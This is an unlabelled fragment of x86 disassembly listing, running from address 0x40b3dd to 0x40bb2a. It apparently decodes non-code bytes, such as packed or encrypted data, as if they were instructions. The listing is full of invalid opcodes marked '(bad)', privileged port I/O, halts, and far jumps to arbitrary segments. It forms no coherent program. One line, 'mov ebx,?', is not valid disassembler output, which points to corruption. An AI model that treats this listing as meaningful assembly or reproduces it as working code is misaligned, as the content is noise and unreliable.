  40b3dd:	push   0x24ca00dc
  40b3e2:	out    dx,al
  40b3e3:	ret    
  40b3e4:	dec    ebx
  40b3e5:	cmc    
  40b3e6:	add    bh,BYTE PTR [ebx+0x709a577f]
  40b3ec:	jo     0x40b46d
  40b3ee:	pop    ebx
  40b3ef:	cmc    
  40b3f0:	(bad)  
  40b3f1:	jg     0x40b404
  40b3f3:	sub    ch,ch
  40b3f5:	imul   ecx,DWORD PTR [eax-0x6b],0x4d4aa627
  40b3fc:	add    eax,0xcfee4ae4
  40b401:	out    dx,al
  40b402:	push   ds
  40b403:	ja     0x40b3a3
  40b405:	mov    BYTE PTR [edi+0x56],bl
  40b408:	sbb    DWORD PTR [ebx-0x478a2115],eax
  40b40e:	sbb    ecx,ebx
  40b410:	jno    0x40b42b
  40b412:	call   0x2c0bdc94
  40b417:	mov    gs:0x423e0fb8,eax
  40b41d:	imul   ecx,DWORD PTR [edi],0x18
  40b420:	rcl    esi,cl
  40b422:	adc    eax,0x8f7c80a7
  40b427:	add    BYTE PTR [edi+0x437fc04b],ch
  40b42d:	scas   eax,DWORD PTR es:[edi]
  40b42e:	mov    ecx,0xd7e38b24
  40b433:	icebp  
  40b434:	ds retf 
  40b436:	jb     0x40b42e
  40b438:	pop    es
  40b439:	mov    esi,0xf5f47f06
  40b43e:	cs hlt 
  40b440:	sti    
  40b441:	adc    eax,0x51c72597
  40b446:	push   edx
  40b447:	popf   
  40b448:	or     BYTE PTR [edx],0xba
  40b44b:	cmc    
  40b44c:	xchg   ecx,eax
  40b44d:	mov    ebp,0xe42c61ee
  40b452:	retf   
  40b453:	ret    
  40b454:	and    BYTE PTR [eax-0x23],bl
  40b457:	out    dx,al
  40b458:	sub    esp,DWORD PTR [eax+0x4]
  40b45b:	call   esp
  40b45d:	or     al,cl
  40b45f:	fimul  DWORD PTR [esp+ebx*8]
  40b462:	xchg   DWORD PTR [eax-0x392c2acd],eax
  40b468:	xchg   ecx,eax
  40b469:	push   ss
  40b46a:	xchg   ebx,eax
  40b46b:	push   ebp
  40b46c:	cmp    eax,0x4d45b3cf
  40b471:	stc    
  40b472:	push   edi
  40b473:	fild   DWORD PTR [esi-0x302f7c35]
  40b479:	int3   
  40b47a:	mov    ebx,esp
  40b47c:	outs   dx,BYTE PTR ds:[esi]
  40b47d:	inc    edi
  40b47e:	in     eax,dx
  40b47f:	cmp    eax,0xde625ab
  40b484:	xchg   ebp,eax
  40b485:	inc    edi
  40b486:	mov    ah,0x4b
  40b488:	(bad)  
  40b489:	fild   DWORD PTR [edx+edx*8+0x7b]
  40b48d:	pop    edx
  40b48e:	shl    BYTE PTR [ebx+0x12934d13],cl
  40b494:	jle    0x40b45b
  40b496:	push   edi
  40b497:	ret    
  40b498:	cmc    
  40b499:	mov    al,0x6c
  40b49b:	inc    esi
  40b49c:	xchg   ecx,eax
  40b49d:	sub    al,0xd2
  40b49f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4a0:	jg     0x40b444
  40b4a2:	lahf   
  40b4a3:	enter  0x5ba6,0x20
  40b4a7:	mov    cl,0xcb
  40b4a9:	lods   al,BYTE PTR ds:[esi]
  40b4aa:	push   esp
  40b4ab:	push   ebp
  40b4ac:	das    
  40b4ad:	cmp    bh,cl
  40b4af:	dec    edi
  40b4b0:	inc    ebx
  40b4b1:	adc    esp,DWORD PTR ds:0x53ed6938
  40b4b7:	in     al,dx
  40b4b8:	dec    edx
  40b4b9:	mov    ebx,0xa00460a5
  40b4be:	addr16 loop 0x40b526
  40b4c1:	fbstp  TBYTE PTR [esi]
  40b4c3:	fldz   
  40b4c5:	pop    ss
  40b4c6:	dec    ebp
  40b4c7:	int    0x6a
  40b4c9:	aam    0xe5
  40b4cb:	xor    eax,0xb5ea6697
  40b4d0:	test   DWORD PTR [ebx-0x54],ebp
  40b4d3:	int    0x63
  40b4d5:	cld    
  40b4d6:	dec    ecx
  40b4d7:	cmp    dl,bh
  40b4d9:	and    ebx,DWORD PTR [ecx+eiz*8]
  40b4dc:	sti    
  40b4dd:	cld    
  40b4de:	sbb    DWORD PTR [esi+0x9b9b09],esp
  40b4e4:	mov    ds:0x16db0cc0,eax
  40b4e9:	mov    ch,0x1
  40b4eb:	jle    0x40b564
  40b4ed:	sub    dl,BYTE PTR [esi+0x63bd60ea]
  40b4f3:	shl    edi,1
  40b4f5:	aas    
  40b4f6:	sbb    BYTE PTR [ecx-0x1878e852],0x9d
  40b4fd:	aaa    
  40b4fe:	repnz push ds
  40b500:	sbb    BYTE PTR [ebp-0x15c29a4f],ah
  40b506:	out    0xed,eax
  40b508:	mov    al,ah
  40b50a:	aas    
  40b50b:	in     al,dx
  40b50c:	inc    edx
  40b50d:	inc    edx
  40b50e:	fnstsw WORD PTR [edx-0x1e]
  40b511:	add    al,0xb9
  40b513:	mov    esi,0x15cebbd4
  40b518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b51a:	jge    0x40b4de
  40b51c:	push   esp
  40b51d:	je     0x40b4ab
  40b51f:	push   eax
  40b520:	test   esp,esi
  40b522:	cs (bad) 
  40b524:	fistp  DWORD PTR [eax+0x44abe1bf]
  40b52a:	cmp    DWORD PTR [edx-0x2f],edi
  40b52d:	xchg   ebp,eax
  40b52e:	mov    ecx,0xaf843220
  40b533:	call   0x863e:0x8388ea29
  40b53a:	inc    edi
  40b53b:	shl    ebx,cl
  40b53d:	ret    
  40b53e:	sbb    eax,0x5d63c563
  40b543:	dec    eax
  40b544:	aas    
  40b545:	call   0xf9ef:0xb0c4f14a
  40b54c:	in     al,0xbe
  40b54e:	es inc esi
  40b550:	dec    esi
  40b551:	outs   dx,BYTE PTR ds:[esi]
  40b552:	sbb    DWORD PTR [eax],0xffffffb4
  40b555:	fisttp DWORD PTR [edx]
  40b557:	xor    BYTE PTR [ebx+0x2e6f1cd4],bh
  40b55d:	cs jae 0x40b57c
  40b560:	repz mov al,0xb2
  40b563:	iret   
  40b564:	jp     0x40b56c
  40b566:	push   cs
  40b567:	add    eax,DWORD PTR [eax+edi*1]
  40b56a:	xor    al,BYTE PTR ds:0xba5526b8
  40b570:	dec    ebx
  40b571:	ins    BYTE PTR es:[edi],dx
  40b572:	sub    BYTE PTR [eax-0x72],bh
  40b575:	bound  edi,QWORD PTR [edx-0x46]
  40b578:	mov    eax,ds:0x7c1d65e1
  40b57d:	sub    BYTE PTR [edx+0x407cd958],0xd0
  40b584:	or     DWORD PTR [ecx+0x59bea64b],ebp
  40b58a:	mov    edx,0xd06b7e79
  40b58f:	sub    al,0xf9
  40b591:	mov    al,0x5e
  40b593:	test   BYTE PTR ds:[ebx+0x16dd122c],al
  40b59a:	mov    esp,0xb807c9c3
  40b59f:	imul   eax,DWORD PTR [edi+0x55],0x3af535ab
  40b5a6:	or     edi,DWORD PTR [edx]
  40b5a8:	daa    
  40b5a9:	dec    esi
  40b5aa:	mov    edx,DWORD PTR [edi-0x4b]
  40b5ad:	fmul   DWORD PTR ds:0x98f3c010
  40b5b3:	mov    edx,0x530ccf6f
  40b5b8:	lds    edi,FWORD PTR [edx-0x6]
  40b5bb:	cmp    al,dl
  40b5bd:	(bad)  
  40b5be:	icebp  
  40b5bf:	fdivr  st,st(7)
  40b5c1:	and    ch,BYTE PTR ds:0xee5c
  40b5c6:	repz mov al,ds:0x89ea56b5
  40b5cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5cd:	test   eax,0x186974ca
  40b5d2:	retf   0xeb3e
  40b5d5:	or     DWORD PTR [esi],esi
  40b5d7:	int3   
  40b5d8:	popa   
  40b5d9:	fmul   st,st(2)
  40b5db:	cmp    BYTE PTR [edi+ecx*8-0x4d11a375],0xff
  40b5e3:	push   esi
  40b5e4:	outs   dx,DWORD PTR ds:[esi]
  40b5e5:	mov    ds:0x1fe6366b,al
  40b5ea:	jmp    0x3bf1:0x6775462
  40b5f1:	xchg   edi,eax
  40b5f2:	sbb    al,0x56
  40b5f4:	dec    ebx
  40b5f5:	iret   
  40b5f6:	lock inc esp
  40b5f8:	iret   
  40b5f9:	daa    
  40b5fa:	and    BYTE PTR [ebx-0x27],ah
  40b5fd:	mov    cl,BYTE PTR [ebp-0x13]
  40b600:	int3   
  40b601:	std    
  40b602:	loopne 0x40b63d
  40b604:	inc    esp
  40b605:	push   esi
  40b606:	adc    BYTE PTR [ecx+ebp*8],bh
  40b609:	test   DWORD PTR [ebx],ebx
  40b60b:	jle    0x40b5e6
  40b60d:	push   ebx
  40b60e:	cdq    
  40b60f:	ret    0x3028
  40b612:	leave  
  40b613:	push   ebp
  40b614:	mov    ecx,0xf98b3531
  40b619:	ficomp WORD PTR [ecx]
  40b61b:	mov    bh,0xc2
  40b61d:	mov    gs,edx
  40b61f:	and    esi,DWORD PTR [eax-0x1f]
  40b622:	pusha  
  40b623:	adc    ebp,DWORD PTR [esi]
  40b625:	push   ebp
  40b626:	inc    esp
  40b627:	test   DWORD PTR [ebx],ebp
  40b629:	in     al,0x5f
  40b62b:	mov    ah,dh
  40b62d:	adc    DWORD PTR [ecx+eiz*8-0x6929cfc9],edx
  40b634:	dec    ebx
  40b635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b636:	sbb    eax,ebp
  40b638:	shl    bl,0x4d
  40b63b:	add    eax,ebp
  40b63d:	lods   al,BYTE PTR ds:[esi]
  40b63e:	pop    esi
  40b63f:	xlat   BYTE PTR ds:[ebx]
  40b640:	(bad)
  40b643:	adc    BYTE PTR [ebx],ch
  40b645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b646:	or     cl,BYTE PTR [edi]
  40b648:	jecxz  0x40b5d8
  40b64a:	sbb    al,0x68
  40b64c:	jmp    0x12b176ae
  40b651:	mov    dl,0xa7
  40b653:	add    al,0x9
  40b655:	dec    eax
  40b656:	popa   
  40b657:	ss (bad) 
  40b659:	clc    
  40b65a:	into   
  40b65b:	jbe    0x40b69b
  40b65d:	sahf   
  40b65e:	mov    bh,0x73
  40b660:	retf   0x6a89
  40b663:	leave  
  40b664:	xor    eax,DWORD PTR [ebx-0x7a91311e]
  40b66a:	arpl   WORD PTR [esi+0x5e],bp
  40b66d:	xchg   edi,eax
  40b66e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b66f:	lods   al,BYTE PTR ss:[esi]
  40b671:	test   al,0xde
  40b673:	xchg   ebx,eax
  40b674:	and    BYTE PTR [edx],0x8
  40b677:	inc    edx
  40b678:	mov    ds,WORD PTR [ebx-0x1]
  40b67b:	mov    eax,0x27e11f8b
  40b680:	cld    
  40b681:	data16 je 0x40b616
  40b684:	dec    edi
  40b685:	inc    ebx
  40b686:	fs pop ecx
  40b688:	adc    bl,cl
  40b68a:	push   esp
  40b68b:	or     bh,al
  40b68d:	pop    es
  40b68e:	aam    0x85
  40b690:	add    BYTE PTR [edi+0x19],0x78
  40b694:	add    al,0xf
  40b696:	cdq    
  40b697:	in     eax,dx
  40b698:	and    al,0xf9
  40b69a:	jae    0x40b64c
  40b69c:	inc    edx
  40b69d:	aas    
  40b69e:	pop    ebx
  40b69f:	sub    cl,BYTE PTR [eax-0x42]
  40b6a2:	or     DWORD PTR [ebp+0x63],esp
  40b6a5:	pop    es
  40b6a6:	inc    edi
  40b6a7:	pop    es
  40b6a8:	and    eax,0x5a9785b9
  40b6ad:	add    DWORD PTR [ebp+0x6f9a71da],ebx
  40b6b3:	icebp  
  40b6b4:	pop    ds
  40b6b5:	adc    esi,DWORD PTR [edx+edi*2+0x39]
  40b6b9:	or     esp,DWORD PTR [edi+0x4f9339bb]
  40b6bf:	sahf   
  40b6c0:	sub    DWORD PTR ds:0x16bedc44,esp
  40b6c6:	retf   
  40b6c7:	nop
  40b6c8:	test   ebp,eax
  40b6ca:	lods   eax,DWORD PTR ds:[esi]
  40b6cb:	mov    ebx,0x643f20f5
  40b6d0:	or     dh,bh
  40b6d2:	lea    eax,[ecx]
  40b6d4:	xchg   esp,eax
  40b6d5:	xchg   DWORD PTR [esi+0xe],esp
  40b6d8:	das    
  40b6d9:	hlt    
  40b6da:	jge    0x40b710
  40b6dc:	retf   
  40b6dd:	mov    ds:0xb9d376bd,al
  40b6e2:	cwde   
  40b6e3:	xor    al,BYTE PTR [ebp+0x30]
  40b6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6e7:	in     al,dx
  40b6e8:	clc    
  40b6e9:	pop    esi
  40b6ea:	pusha  
  40b6eb:	(bad)  
  40b6ec:	je     0x40b68f
  40b6ee:	sbb    DWORD PTR ds:[edi-0x4e],ebp
  40b6f2:	and    al,0xb6
  40b6f4:	pop    ss
  40b6f5:	mov    cl,0xbc
  40b6f7:	pop    ecx
  40b6f8:	dec    BYTE PTR [esi-0xd]
  40b6fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6fc:	std    
  40b6fd:	and    DWORD PTR [edi+0x67],esi
  40b700:	std    
  40b701:	mov    dh,0x65
  40b703:	int    0x6e
  40b705:	out    dx,al
  40b706:	jae    0x40b6b9
  40b708:	pop    edi
  40b709:	ret    
  40b70a:	xchg   esi,eax
  40b70b:	test   DWORD PTR [edx+0x7],edi
  40b70e:	push   esi
  40b70f:	ret    
  40b710:	jmp    0x8655:0x80202e9f
  40b717:	gs ins DWORD PTR es:[edi],dx
  40b719:	jecxz  0x40b733
  40b71b:	inc    ebx
  40b71c:	inc    esp
  40b71d:	inc    ecx
  40b71e:	pop    eax
  40b71f:	dec    eax
  40b720:	rcr    DWORD PTR [ebx+0x48],1
  40b723:	dec    edx
  40b724:	inc    eax
  40b725:	mov    esp,0xadbd0443
  40b72a:	aaa    
  40b72b:	pop    ebx
  40b72c:	call   0xac47713
  40b731:	xor    eax,0xce4c60fd
  40b736:	aad    0xb1
  40b738:	push   0x2cf3c947
  40b73d:	adc    DWORD PTR [edx-0x1f],ebx
  40b740:	pop    ds
  40b741:	shr    ebx,cl
  40b743:	imul   ebx,DWORD PTR [ecx],0x38
  40b746:	lock cwde 
  40b748:	data16 xchg BYTE PTR [ebx+0x69],ch
  40b74c:	push   esi
  40b74d:	cli    
  40b74e:	pop    ebp
  40b74f:	es xor eax,0xd444a54c
  40b755:	(bad)  
  40b756:	sbb    BYTE PTR [esi],bl
  40b758:	pop    ss
  40b759:	imul   ebp,DWORD PTR [ecx-0x1f],0xfb9095fa
  40b760:	popa   
  40b761:	mov    edi,DWORD PTR [edx]
  40b763:	xchg   esp,eax
  40b764:	mov    esp,0xe193d4f3
  40b769:	sub    ah,BYTE PTR [esi-0x80]
  40b76c:	fimul  DWORD PTR [eax+0x5eb63df2]
  40b772:	call   0xe7a6:0xac161574
  40b779:	fdiv   QWORD PTR [edx]
  40b77b:	rcl    ecx,0x84
  40b77e:	xchg   ebp,eax
  40b77f:	mov    esi,0x28505e2a
  40b784:	xor    eax,0xe7b35866
  40b789:	add    DWORD PTR [ebp+0x73a8516c],eax
  40b78f:	aad    0xf9
  40b791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b792:	nop
  40b793:	or     ch,BYTE PTR ds:0xcfcd4443
  40b799:	xor    eax,0x91b925a4
  40b79e:	lods   al,BYTE PTR ds:[esi]
  40b79f:	popf   
  40b7a0:	or     eax,0x562f05d8
  40b7a5:	adc    DWORD PTR [esp+ecx*2-0x644d8e82],0xffffffd4
  40b7ad:	xchg   ebp,eax
  40b7ae:	xlat   BYTE PTR ds:[ebx]
  40b7af:	adc    BYTE PTR [esi+0x1d],0xc1
  40b7b3:	xchg   esp,ebx
  40b7b5:	mov    esp,0xb3ded0cb
  40b7ba:	jle    0x40b7d9
  40b7bc:	cmp    al,0x26
  40b7be:	retf   
  40b7bf:	jmp    0x4a4f:0x75238356
  40b7c6:	fild   QWORD PTR [esi]
  40b7c8:	push   0xfffffffb
  40b7ca:	xchg   ebx,eax
  40b7cb:	dec    esp
  40b7cc:	inc    ebx
  40b7cd:	sbb    DWORD PTR [eax],ebp
  40b7cf:	(bad)  
  40b7d1:	mul    BYTE PTR [edi-0x3f914e02]
  40b7d7:	xor    DWORD PTR [ebx-0x28b539ec],edi
  40b7dd:	xor    bl,BYTE PTR [edx]
  40b7df:	pop    es
  40b7e0:	(bad)  
  40b7e1:	bnd jl 0x40b7af
  40b7e4:	sub    eax,0xf6555547
  40b7e9:	and    cl,bh
  40b7eb:	outs   dx,BYTE PTR ds:[esi]
  40b7ec:	out    0x46,eax
  40b7ee:	lea    esi,[edi+eiz*1+0x6b580c57]
  40b7f5:	(bad)  
  40b7f6:	test   al,0x38
  40b7f8:	rcl    DWORD PTR [edi+eiz*8],cl
  40b7fb:	cdq    
  40b7fc:	mov    al,ds:0x4773fdb3
  40b801:	push   eax
  40b802:	pop    eax
  40b803:	aad    0x3a
  40b805:	icebp  
  40b806:	aad    0xea
  40b808:	inc    edi
  40b809:	sahf   
  40b80a:	adc    al,0xbf
  40b80c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b80d:	mov    dh,bh
  40b80f:	icebp  
  40b810:	aas    
  40b811:	inc    BYTE PTR [eax-0x6a12cd49]
  40b817:	adc    ch,BYTE PTR [ebx]
  40b819:	stc    
  40b81a:	pop    edi
  40b81b:	bound  eax,QWORD PTR [esi]
  40b81d:	ret    
  40b81e:	iret   
  40b81f:	dec    esi
  40b821:	mov    al,ds:0xdf71e388
  40b826:	mov    ebx,?
  40b828:	push   ss
  40b829:	push   es
  40b82a:	dec    edi
  40b82b:	cmp    ch,BYTE PTR [edx]
  40b82d:	pop    edx
  40b82e:	mov    ebp,0x66f1cfd
  40b833:	mov    esi,0x48a0f767
  40b838:	je     0x40b7fa
  40b83a:	push   eax
  40b83b:	add    DWORD PTR [esi+0x6d09fb2e],eax
  40b841:	shr    BYTE PTR [edx+ebp*8-0x322429b1],0xd8
  40b849:	ds repnz std 
  40b84c:	leave  
  40b84d:	outs   dx,BYTE PTR ds:[esi]
  40b84e:	call   0x7fa4:0x3569
  40b854:	(bad)  
  40b856:	jmp    0x1a2c7b66
  40b85b:	push   es
  40b85c:	adc    ebx,DWORD PTR [ecx+0x4c7deedc]
  40b862:	mov    esi,0xdd2fd440
  40b867:	(bad)  
  40b868:	push   ecx
  40b869:	fs mov bl,0x19
  40b86c:	in     al,0xe8
  40b86e:	jne    0x40b8b1
  40b870:	gs push 0x742fb603
  40b876:	and    al,0xf6
  40b878:	and    dh,BYTE PTR [esi-0x5cdb89a3]
  40b87e:	adc    DWORD PTR [edx-0x256fc9e7],ebp
  40b884:	jl     0x40b8cd
  40b886:	xchg   esp,eax
  40b887:	std    
  40b888:	mov    esp,0x6468f923
  40b88d:	in     eax,0xe3
  40b88f:	loopne 0x40b88e
  40b891:	sbb    BYTE PTR [ecx],ah
  40b893:	sbb    BYTE PTR [ebx+0x46],ah
  40b896:	jns    0x40b8e0
  40b898:	ss retf 0x416b
  40b89c:	out    0x4d,eax
  40b89e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b89f:	sub    edx,eax
  40b8a1:	ins    BYTE PTR es:[edi],dx
  40b8a2:	pop    esp
  40b8a3:	int3   
  40b8a4:	sbb    ch,dl
  40b8a6:	scas   al,BYTE PTR es:[edi]
  40b8a7:	scas   eax,DWORD PTR es:[edi]
  40b8a8:	jle    0x40b8e1
  40b8aa:	ds in  eax,0x32
  40b8ad:	popa   
  40b8ae:	call   0xdf9d5d3
  40b8b3:	arpl   WORD PTR [ecx],di
  40b8b5:	fistp  DWORD PTR [esi+0x2d]
  40b8b8:	(bad)  
  40b8b9:	aas    
  40b8ba:	ffreep st(6)
  40b8bc:	(bad)  
  40b8be:	mov    DWORD PTR [ebx+0x66173567],ecx
  40b8c4:	mov    eax,ds:0x97d8619c
  40b8c9:	sar    BYTE PTR [edi],cl
  40b8cb:	cmp    bl,BYTE PTR [ecx]
  40b8cd:	sub    eax,0x3f37a03c
  40b8d2:	cli    
  40b8d3:	pop    ds
  40b8d4:	sbb    eax,0x4591a629
  40b8d9:	mov    ah,0x9f
  40b8db:	in     al,0x26
  40b8dd:	lock push 0xffffffd3
  40b8e0:	data16 lock shl BYTE PTR [edi+0x3746b9f7],0x3
  40b8e9:	sbb    eax,DWORD PTR [ecx]
  40b8eb:	(bad)  
  40b8ec:	pop    esp
  40b8ed:	enter  0x5d5,0xd6
  40b8f1:	ror    DWORD PTR [edi-0x21],0xf4
  40b8f5:	scas   al,BYTE PTR es:[edi]
  40b8f6:	sbb    eax,0x418a26e6
  40b8fb:	es pop esi
  40b8fd:	dec    edx
  40b8fe:	or     al,0xa1
  40b900:	mov    ch,0x9a
  40b902:	push   0xd07da83f
  40b907:	sbb    DWORD PTR [ecx+0xe],ebp
  40b90a:	lea    edi,[ebp+0x9c6b60f]
  40b910:	inc    ecx
  40b911:	add    DWORD PTR [ebx+0x54d946e5],ebx
  40b917:	push   ebx
  40b918:	mov    ss,WORD PTR [edi+edi*4+0x1096cdbc]
  40b91f:	mov    ch,BYTE PTR [ecx]
  40b921:	xchg   esp,eax
  40b922:	fs iret 
  40b924:	movlps xmm4,QWORD PTR [eax-0x68]
  40b928:	cwde   
  40b929:	mov    WORD PTR [ebp-0x80],gs
  40b92c:	jo     0x40b97e
  40b92e:	pop    ebx
  40b92f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b930:	and    eax,0x8750ce4c
  40b935:	cmp    DWORD PTR [esi],0xffffffa5
  40b938:	shr    BYTE PTR [ebx],1
  40b93a:	fisttp DWORD PTR gs:[edx+0x31]
  40b93e:	loope  0x40b965
  40b940:	push   esi
  40b941:	cld    
  40b942:	(bad)  [edi-0x7d]
  40b945:	jmp    0x1d0d:0xadfc140a
  40b94c:	enter  0xc0b3,0xe
  40b950:	jo     0x40b90e
  40b952:	sub    bh,BYTE PTR [edx-0x7d]
  40b955:	add    BYTE PTR [eax+0x44],dl
  40b958:	in     al,dx
  40b959:	inc    edx
  40b95a:	push   ss
  40b95b:	or     eax,0x27446fab
  40b960:	pop    esp
  40b961:	inc    edx
  40b962:	scas   al,BYTE PTR es:[edi]
  40b963:	push   es
  40b964:	fucomi st,st(1)
  40b966:	(bad)  
  40b967:	int    0x86
  40b969:	jns    0x40b985
  40b96b:	hlt    
  40b96c:	adc    ebx,esp
  40b96e:	sub    eax,0xabd17b73
  40b973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b974:	and    DWORD PTR [eax-0x9d25b42],ebx
  40b97a:	xor    edx,DWORD PTR [edi]
  40b97c:	shr    ebx,0x17
  40b97f:	sti    
  40b980:	popa   
  40b981:	pop    esp
  40b982:	inc    ebx
  40b983:	in     eax,0xbc
  40b985:	test   eax,0x5a816d78
  40b98a:	dec    esp
  40b98b:	aas    
  40b98c:	out    0x3e,eax
  40b98e:	push   edx
  40b98f:	inc    ecx
  40b990:	sahf   
  40b991:	pop    es
  40b992:	jl     0x40b921
  40b994:	jg     0x40b98a
  40b996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b997:	sbb    DWORD PTR [ebx+0x113b3bf9],esi
  40b99d:	outs   dx,BYTE PTR ds:[esi]
  40b99e:	mov    ch,0x1c
  40b9a0:	mov    ecx,0xa2f6f7c6
  40b9a5:	mov    bl,0x4d
  40b9a7:	pop    es
  40b9a8:	inc    ebx
  40b9a9:	clc    
  40b9aa:	(bad)  
  40b9ab:	sub    eax,DWORD PTR [esi]
  40b9ad:	pop    es
  40b9ae:	jg     0x40b985
  40b9b0:	sub    eax,DWORD PTR [ebp+0x3ddbfdc]
  40b9b6:	adc    eax,0x3272a483
  40b9bb:	push   edx
  40b9bc:	dec    ebx
  40b9bd:	pop    es
  40b9be:	lods   eax,DWORD PTR ds:[esi]
  40b9bf:	sbb    al,0x1f
  40b9c1:	mov    ch,0xa6
  40b9c3:	inc    ecx
  40b9c4:	mov    ebx,0xb18f1743
  40b9c9:	pop    ds
  40b9ca:	push   ss
  40b9cb:	sub    al,0x1a
  40b9cd:	outs   dx,DWORD PTR ds:[esi]
  40b9ce:	inc    ecx
  40b9cf:	sub    DWORD PTR [esi-0x3474c223],ebp
  40b9d5:	ret    
  40b9d6:	and    eax,0xe461163
  40b9db:	neg    esi
  40b9dd:	stos   BYTE PTR es:[edi],al
  40b9de:	(bad)  
  40b9e0:	push   cs
  40b9e1:	test   DWORD PTR [ecx-0xc4119f5],ecx
  40b9e7:	fsubr  st,st(5)
  40b9e9:	xchg   edx,eax
  40b9ea:	fwait
  40b9eb:	pop    edx
  40b9ec:	call   0xe460:0xecba618f
  40b9f3:	inc    DWORD PTR [ebp-0x7d1da0f1]
  40b9f9:	cmc    
  40b9fa:	rol    DWORD PTR [eax-0x5f],1
  40b9fd:	jb     0x40b9bb
  40b9ff:	fld    DWORD PTR [esi-0x3d59e610]
  40ba05:	mov    cl,0xb9
  40ba07:	(bad)  
  40ba08:	cmc    
  40ba09:	fisubr DWORD PTR [ebx-0x6eb658ef]
  40ba0f:	dec    edi
  40ba10:	mov    ds:0xdbb98bcd,eax
  40ba15:	lods   eax,DWORD PTR gs:[si]
  40ba18:	rcr    BYTE PTR [edx-0x4f],1
  40ba1b:	mov    ah,bl
  40ba1d:	imul   eax,esp,0x7e16b535
  40ba23:	mov    al,ds:0x33d4d28e
  40ba28:	jl     0x40b9b4
  40ba2a:	in     al,dx
  40ba2b:	lea    edi,[edx+ecx*1+0x37]
  40ba2f:	cmp    BYTE PTR ds:0x61c59d8b,dh
  40ba35:	pop    ecx
  40ba36:	fild   QWORD PTR [ecx]
  40ba38:	mov    ds:0xa99f729d,eax
  40ba3d:	mov    esp,0xa71f33a0
  40ba42:	xchg   ebx,eax
  40ba43:	mov    al,ds:0x8190a86c
  40ba48:	mov    ebp,0xc3481650
  40ba4d:	mov    ebp,0x7138df47
  40ba52:	cli    
  40ba53:	jmp    0x40ba51
  40ba55:	pop    ds
  40ba56:	(bad)  
  40ba57:	clc    
  40ba58:	mov    ch,0x43
  40ba5a:	jns    0x40ba16
  40ba5c:	ds (bad) 
  40ba5e:	hlt    
  40ba5f:	out    0xef,al
  40ba61:	or     al,0x6
  40ba63:	loop   0x40ba78
  40ba65:	sub    BYTE PTR [edx-0x4b],ch
  40ba68:	xchg   edi,eax
  40ba69:	pushf  
  40ba6a:	cmp    eax,0xef95f38c
  40ba6f:	mov    bl,0x28
  40ba71:	not    ebp
  40ba73:	ror    BYTE PTR [eax+0xc],cl
  40ba76:	sahf   
  40ba77:	mov    dl,BYTE PTR [ecx]
  40ba79:	fwait
  40ba7a:	xchg   DWORD PTR [ecx+0x2b],ecx
  40ba7d:	xchg   ebx,eax
  40ba7e:	xchg   ebx,eax
  40ba7f:	sub    dl,al
  40ba81:	pop    di
  40ba83:	out    0xa8,al
  40ba85:	fsub   st(3),st
  40ba87:	stos   DWORD PTR es:[edi],eax
  40ba88:	pop    esp
  40ba89:	jmp    0x40bad4
  40ba8b:	bound  esi,QWORD PTR [ecx-0x79257e95]
  40ba91:	rcl    DWORD PTR [ebx-0x16],0xde
  40ba95:	sbb    al,0x98
  40ba97:	xor    eax,0xca9682aa
  40ba9c:	sbb    ah,BYTE PTR [eax-0x3d5db6e5]
  40baa2:	sub    DWORD PTR [ebp+0x3f155f90],ebp
  40baa8:	adc    DWORD PTR [ebx],edx
  40baaa:	dec    esp
  40baab:	mov    cl,0x51
  40baad:	in     eax,0x81
  40baaf:	imul   DWORD PTR [edx-0x3c]
  40bab2:	and    BYTE PTR [esi+ecx*4],ah
  40bab5:	inc    edx
  40bab6:	mov    ds:0xcf2a613f,al
  40babb:	outs   dx,BYTE PTR ds:[si]
  40babd:	(bad)  
  40babe:	(bad)  
  40babf:	cmc    
  40bac0:	pop    edi
  40bac1:	nop
  40bac2:	test   BYTE PTR [edi],dl
  40bac4:	jnp    0x40bab0
  40bac6:	add    al,0x4d
  40bac8:	jne    0x40bb01
  40baca:	cmc    
  40bacb:	lock pusha 
  40bacd:	sub    ecx,DWORD PTR [eax+esi*8-0x1]
  40bad1:	(bad)  
  40bad3:	and    al,BYTE PTR [edx]
  40bad5:	inc    edi
  40bad6:	subps  xmm4,XMMWORD PTR [edx+0x694af3f8]
  40badd:	nop
  40bade:	cmc    
  40badf:	jo     0x40bb28
  40bae1:	stc    
  40bae2:	cmp    BYTE PTR [edx],bh
  40bae4:	dec    ecx
  40bae5:	lock sub eax,0x837e1317
  40baeb:	or     ch,cl
  40baed:	int    0x4a
  40baef:	push   0xffffff83
  40baf1:	adc    al,bl
  40baf3:	inc    ebp
  40baf4:	sbb    cl,BYTE PTR [ebx-0x7abe6fa4]
  40bafa:	test   DWORD PTR [ecx],esi
  40bafc:	cs mov bl,0x6f
  40baff:	mov    cl,dl
  40bb01:	add    DWORD PTR [eax],edi
  40bb03:	jo     0x40baee
  40bb05:	in     al,dx
  40bb06:	push   esp
  40bb07:	xchg   ebp,eax
  40bb08:	push   ss
  40bb09:	outs   dx,DWORD PTR ds:[esi]
  40bb0a:	pop    ds
  40bb0b:	dec    edi
  40bb0c:	test   DWORD PTR [edx+0x7af12a7],edx
  40bb12:	dec    ecx
  40bb13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb14:	sbb    esi,DWORD PTR [edx]
  40bb16:	loope  0x40bafc
  40bb18:	inc    eax
  40bb19:	mov    BYTE PTR [esi+0x35],cl
  40bb1c:	pusha  
  40bb1d:	mov    ah,0x2e
  40bb1f:	in     al,0xf6
  40bb21:	or     ebp,DWORD PTR cs:[edi]
  40bb24:	mov    BYTE PTR [ebx+0x6c],cl
  40bb27:	mov    ah,0x94
  40bb29:	cmc    
  40bb2a:	xchg   esi,eax
